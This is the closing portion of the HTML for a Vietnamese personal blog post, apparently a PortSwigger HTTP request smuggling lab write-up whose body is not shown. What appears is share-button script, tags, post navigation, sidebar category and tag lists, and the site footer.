+                text: "https://rayinaw.github.io/2022/12/02/HRS-PortSwigger/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rayinaw.github.io/2022/12/02/HRS-PortSwigger/";
+            const title         = "「Portswigger HTTP Request smuggling」";
+            const excerpt       = `Portswigger: HTTP Request smuggling:HTTP request smuggling, basic CL.TE vulnerability
+
+Yêu cầu: Làm cho server trả về...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/HRS/" rel="tag">HRS</a>, <a class="tag-none-link" href="/tags/Portswigger/" rel="tag">Portswigger</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2024-09-05T07:16:54.213Z" itemprop="dateModified">Lần chỉnh sửa cuối cùng：2024-09-05</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" Khái niệm cơ bản về HTTP request smuggling với HTTP/1.1" href="/2022/11/30/http-request-smuggling-HTTP-1.1/">&lt; Bài đăng cũ hơn</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" Một bản ghi chép nhỏ về Docker" href="/2022/12/03/docker-learning/">Bài đăng mới hơn &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" loading="lazy" decoding="auto">
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">来年の事を言えば鬼が笑う</p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                Bài đăng
+            </span>
+            <span class="count">
+                15
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                Thể loại
+            </span>
+            <span class="count">
+                11
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                Thẻ
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>Thể loại</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/">DevOps</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Docker/">Docker</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Nginx/">Nginx</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/DevOps/Nginx/Docker/">Docker</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/">HTTP Request Smuggling</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/HTTP-Request-Smuggling/Portswigger/">Portswigger</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Deserialization/">Deserialization</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/Programming/">Programming</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/SQLi/">SQLi</a><span class="category-list-count">1</span></li></ul></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>Những thẻ hiện có</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Commons-Collections/" style="font-size: 0.72em;">Commons Collections</a> <a href="/tags/Deserialization/" style="font-size: 0.76em;">Deserialization</a> <a href="/tags/DevOps/" style="font-size: 0.64em;">DevOps</a> <a href="/tags/Docker/" style="font-size: 0.68em;">Docker</a> <a href="/tags/HRS/" style="font-size: 0.68em;">HRS</a> <a href="/tags/Java/" style="font-size: 0.8em;">Java</a> <a href="/tags/Mysql/" style="font-size: 0.6em;">Mysql</a> <a href="/tags/Nginx/" style="font-size: 0.6em;">Nginx</a> <a href="/tags/Portswigger/" style="font-size: 0.6em;">Portswigger</a> <a href="/tags/Programming/" style="font-size: 0.6em;">Programming</a> <a href="/tags/Reflection/" style="font-size: 0.6em;">Reflection</a> <a href="/tags/SQLi/" style="font-size: 0.6em;">SQLi</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>Bài viết gần đây</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/12/10/writing-a-kubenetes-yaml/"><i class="fa  fa-book"></i> Học cách viết và hiểu một Kubernetes YAML files</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/07/17/gobuffalo-soda-cli/"><i class="fa  fa-book"></i> Gobuffalo Soda-cli</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/06/23/kubernetes-learning/"><i class="fa  fa-book"></i> Kubernetes learning</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/04/15/nginx-learning/"><i class="fa  fa-book"></i> Nginx Learning Journey</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/20/CommonsCollections3/"><i class="fa  fa-book"></i> Phân tích chuỗi Commons Collections 3</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer" class="ap-lrc">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:rayin.awarf@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope"></i></a></li>
+                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://t.me/rayinaw"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/rayinaw"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2024 Rayinaw All rights reserved.</li>
+                            <li>This site has been running for<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank" rel="external nofollow noopener noreferrer">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Rayinaw.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank" rel="external nofollow noopener noreferrer">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js server="netease" type="playlist" id="3204190542" order="random" fixed="true">
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
